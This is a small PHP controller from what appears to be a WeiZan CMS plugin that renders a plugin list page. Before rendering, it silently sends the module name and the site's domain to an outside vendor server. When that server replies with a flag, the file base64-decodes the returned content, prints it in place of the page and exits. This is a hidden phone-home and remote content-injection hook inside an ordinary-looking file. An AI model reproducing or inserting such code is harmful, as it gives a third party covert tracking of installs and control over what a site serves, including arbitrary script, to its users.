<?php
defined('IN_IA') or exit('Access Denied');
$ops = array(
    'list'
);
$op  = in_array($op, $ops) ? $op : 'list';
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if ($op == 'list') {
    include wl_template('app/plugins_list');
}
